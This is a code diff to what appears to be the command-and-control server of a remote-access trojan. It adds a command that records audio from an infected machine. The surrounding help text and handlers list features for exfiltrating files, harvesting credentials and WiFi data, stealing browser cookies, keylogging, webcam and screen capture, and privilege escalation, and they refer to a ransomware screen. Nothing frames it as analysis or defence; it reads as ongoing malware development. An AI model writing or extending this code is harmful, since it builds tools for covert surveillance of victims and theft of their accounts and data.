@@ -240,6 +240,7 @@ def init_socket_handlers(socketio):
                         "  #exfiltrate <file> - Download file from agent to C2 loot\r\n"
                         "  #screenshot        - Take a screenshot\r\n"
                         "  #webshot           - Take a webcam capture\r\n"
+                        "  #captureaudio [s]  - Record audio for [s] seconds (default 15)\r\n"
                         "  #creds             - Harvest credentials, history, and WiFi\r\n"
                         "  #cookies           - Steal browser cookies\r\n"
                         "  #keylogger         - Start keylogger\r\n"
@@ -394,6 +395,12 @@ result = "Ransomware screen cleared and Explorer restarted"
                     task_type = 'screenshot'
                 elif cmd_type == 'webshot':
                     task_type = 'webcam'
+                elif cmd_type == 'captureaudio':
+                    task_type = 'audio_capture'
+                    if arg and arg.isdigit():
+                        task_data = {'seconds': int(arg)}
+                    else:
+                        task_data = {'seconds': 15}  # Default to 15 seconds if no duration provided
                 elif cmd_type == 'creds':
                     task_type = 'harvest_creds'
                 elif cmd_type == 'getsystem':
